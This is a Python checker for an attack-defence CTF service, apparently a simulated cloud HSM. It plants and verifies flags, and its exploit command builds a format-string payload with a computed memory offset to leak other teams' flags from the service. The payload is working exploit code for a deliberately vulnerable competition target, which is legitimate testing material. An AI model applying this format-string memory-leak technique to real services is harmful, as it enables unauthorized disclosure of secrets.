#!/usr/bin/env python3
import hashlib
import json
import logging
import os
import random
import string

import requests
import subprocess
import sys
import traceback

OK, CORRUPT, MUMBLE, DOWN, CHECKER_ERROR = 101, 102, 103, 104, 110

SERVICE_PROTO = "http"
SERVICE_PORT = 9000
HTTP_TIMEOUT = 10
PASSWORD_LENGTH = 12
OAUTH_LOCAL = True  # True if generate locally, False if make request to remote OAuth service
OAUTH_SERVER_PORT = 8080
OAUTH_SERVER_HOST = "localhost"


class ProtocolViolationError(Exception):
    pass


def gen_str(charset: str, length: int):
    return "".join(random.choices(charset, k=length))


def verdict(exit_code, public="", private=""):
    if private:
        logging.error(private)
    if public:
        logging.info("Public verdict: %r.", public)
        print(public)
    logging.info("Exit with code: %d.", exit_code)
    sys.exit(exit_code)


def info():
    verdict(OK, "\n".join([
        "vulns: 1",
        "public_flag_description: Flag ID is SLOT:USERNAME, flag is plaintext."
    ]))


def assert_no_http_error(response: requests.Response, verdict_on_http_error: int, url: str = None):
    if response.status_code != 200:
        logging.error("Error %d, response: %r.", response.status_code, response.text)
        public = "Got {!r} status code on {!r} request.".format(response.status_code, url)
        verdict(verdict_on_http_error, public=public)
    return response


class Client:
    def __init__(self, host: str, port: int, oauth: str = None, verdict_on_http_error: int = MUMBLE):
        self.base_url = "{}://{}:{}".format(SERVICE_PROTO, host, port)
        self.session = requests.Session()
        self.verdict_on_http_error = verdict_on_http_error
        if oauth is not None:
            self.session.headers["RateLimitingToken"] = oauth

    def url(self, suffix: str):
        return self.base_url + suffix

    def get(self, url_suffix: str):
        url = self.url(url_suffix)
        logging.info("Sending GET %r ...", url)
        response = self.session.get(url, timeout=HTTP_TIMEOUT)
        text = assert_no_http_error(response, self.verdict_on_http_error, url).text
        logging.info("Success, response: %r.", text)
        return text

    def post(self, url_suffix: str, **kwargs):
        url = self.url(url_suffix)
        logging.info("Sending POST %r: %r ...", url, kwargs)
        override_verdict_on_http_error = kwargs.pop("verdict_on_http_error", None)
        response = self.session.post(url, timeout=HTTP_TIMEOUT, data=kwargs)
        text = assert_no_http_error(response, override_verdict_on_http_error or self.verdict_on_http_error, url).text
        logging.info("Success, response: %r.", text)
        return text

    def register(self, username: str, password: str, token: str):
        return self.post("/register", username=username, password=password, token=token)

    def login(self, username, password):
        return self.post("/login", username=username, password=password, verdict_on_http_error=CORRUPT)

    def generate(self):
        resp = self.get("/generate")
        tokens = resp.split(" = ")
        if len(tokens) != 2:
            verdict(MUMBLE, public="Generate returned wrong data")
        return tokens  # slot, pubkey

    def decrypt(self, ciphertext: str):
        return self.post("/decrypt", ciphertext=ciphertext)

    def set_meta(self, meta: str):
        return self.post("/setmeta", meta=meta)

    def get_meta(self):
        return self.get("/getmeta")

    def get_plaintext(self):
        return self.get("/getplaintext")


def make_password(flag_id: str, length: int = PASSWORD_LENGTH):
    salt = "9cf53e9d-5f05-42c3-a04a-20b07be2b5fb"
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    digest = hashlib.sha256((salt + flag_id).encode()).digest()
    return "".join(charset[b % len(charset)] for b in digest[:length])


def make_long_meta(flag_id: str):
    long_meta = make_password(flag_id + "aa", length=64) + make_password(flag_id + "bb", length=64)
    long_meta = long_meta[:33]
    if len(long_meta) != 33:
        raise ValueError("Invalid meta length: {!r}".format(long_meta))
    return long_meta


def make_plaintext(flag: str) -> str:
    return "Hello, Mr. John Doe! See: " + flag


def get_oauth():
    if OAUTH_LOCAL:
        oauth = "FAKE_OAUTH"  # FIXME: implement as a backup? Separate service for teams will be required.
    else:
        c = Client(OAUTH_SERVER_HOST, OAUTH_SERVER_PORT, verdict_on_http_error=CHECKER_ERROR)
        oauth = c.get("/")  # FIXME: implement it!
    # FIXME: add token caching?
    logging.info("Got new OAuth token: %r.", oauth)
    return oauth


def encrypt(plaintext: bytes, pubkey_hex: str):
    plaintext_hex = plaintext.hex().upper()
    logging.info("Encrypting %r (%s) with pubkey %r ...", plaintext, plaintext_hex, pubkey_hex)
    env = os.environ.copy()
    env["LD_LIBRARY_PATH"] = "."
    proc = subprocess.Popen(["./encrypt", pubkey_hex, plaintext_hex], stdout=subprocess.PIPE, env=env)
    stdout, _ = proc.communicate()
    ciphertext = stdout.decode().strip()
    logging.info("Ciphertext: %r (length: %d).", ciphertext, len(ciphertext))
    return ciphertext


def check(host):
    c = Client(host, SERVICE_PORT, get_oauth())
    if "To use Cloud HSM Service, you must:" in c.get("/"):
        verdict(OK)
    else:
        verdict(MUMBLE, public="Prompt not found")


def put(host, flag_id, flag, vuln):
    flag_id = flag_id.replace("-", "")

    c = Client(host, SERVICE_PORT, get_oauth())
    c.register(username=flag_id, password=make_password(flag_id), token="nonce")

    slot, pubkey = c.generate()
    long_meta = make_long_meta(flag_id)  # Important to check all 33 chars!
    c.set_meta(long_meta)

    remote_meta = c.get_meta()
    if not remote_meta:
        verdict(MUMBLE, public="No meta-information returned")
    if remote_meta != long_meta:
        verdict(MUMBLE, public="Meta-information doesn't match")

    c.set_meta(long_meta[8:16])  # So that vuln is not obvious :)

    plaintext = make_plaintext(flag)
    ciphertext = encrypt(plaintext.encode(), pubkey)  # Local encryption

    c.decrypt(ciphertext)
    remote_plaintext = c.get_plaintext()

    if flag not in remote_plaintext:
        verdict(MUMBLE, public="Flag not found")
    if remote_plaintext != plaintext:
        verdict(MUMBLE, public="Plaintext was modified")

    json_flag_id = json.dumps({
        "public_flag_id": "{}:{}".format(slot, flag_id)  # Slot is helpful for exploitation
    }).replace(" ", "")
    verdict(OK, json_flag_id)


def get(host, flag_id, flag, vuln):
    slot, flag_id = json.loads(flag_id)["public_flag_id"].split(":")

    c = Client(host, SERVICE_PORT, get_oauth())
    c.login(username=flag_id, password=make_password(flag_id))

    plaintext = make_plaintext(flag)
    remote_plaintext = c.get_plaintext()

    if flag not in remote_plaintext:
        verdict(MUMBLE, public="Flag not found")
    if remote_plaintext != plaintext:
        verdict(MUMBLE, public="Plaintext was modified")

    verdict(OK, "Flag found")


def exploit(host, slot):
    slot = int(slot)

    credentials_filename = "exploit.credentials.txt"
    pubkey_filename = "exploit.pubkey.txt"
    pubkey = None
    c = Client(host, SERVICE_PORT, get_oauth())
    try:
        with open(credentials_filename) as f:
            username, password = f.readline().strip().split(":")
        c.login(username, password)
        with open(pubkey_filename) as f:
            pubkey = f.readline().strip()
    except FileNotFoundError:
        username = gen_str(charset=string.ascii_lowercase + string.digits, length=12)
        password = make_password(username)
        c.register(username, password, token="nonce")
        with open(credentials_filename, "w") as f:
            f.writelines([username + ":" + password])
    if pubkey is None:
        _, pubkey = c.generate()
        with open(pubkey_filename, "w") as f:
            f.writelines([pubkey])
        c.set_meta(gen_str(string.digits, 33))  # Length is important! Must be 33.

    slot0_offset = 0x4002f530
    slot_size = 392
    plaintext_offset = 4 + 33  # idx(4) + meta(33)
    read_offset = slot0_offset + slot_size * slot + plaintext_offset
    read_offset_bytes = read_offset.to_bytes(4, byteorder="big")
    payload = b"910" + read_offset_bytes + b"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x|%s"

    ciphertext = encrypt(payload, pubkey)
    c.decrypt(ciphertext)
    meta = c.get_meta()

    if "|" not in meta:
        verdict(CHECKER_ERROR, public="Exploit has failed.")

    logging.info("Hacked! Flag: %r", meta.split("|")[1])
    verdict(OK)


def main(args):
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")

    cmd_mapping = {
        "info":     (info, 0),
        "check":    (check, 1),
        "put":      (put, 4),
        "get":      (get, 4),
        "exploit":  (exploit, 2),
    }

    if not args:
        verdict(CHECKER_ERROR, "No args", "No args")

    cmd, args = args[0], args[1:]
    if cmd not in cmd_mapping:
        verdict(CHECKER_ERROR, "Checker error", "Wrong command %s" % cmd)

    handler, args_count = cmd_mapping[cmd]
    if len(args) != args_count:
        verdict(CHECKER_ERROR, "Checker error", "Wrong args count for %s (%d, expected: %d)" %
                (cmd, len(args), args_count))

    try:
        handler(*args)
    except ProtocolViolationError as E:
        verdict(MUMBLE, "Protocol violation", "Protocol violation: %s" % traceback.format_exc())
    except ConnectionRefusedError as E:
        verdict(DOWN, "Connect refused", "Connect refused: %s" % E)
    except ConnectionError as E:
        verdict(MUMBLE, "Connection aborted", "Connection aborted: %s" % E)
    except OSError as E:
        verdict(DOWN, "Connect error", "Connect error: %s" % E)
    except Exception as E:
        verdict(CHECKER_ERROR, "Checker error", "Checker error: %s" % traceback.format_exc())
    verdict(CHECKER_ERROR, "Checker error", "No verdict")


if __name__ == "__main__":
    main(args=sys.argv[1:])
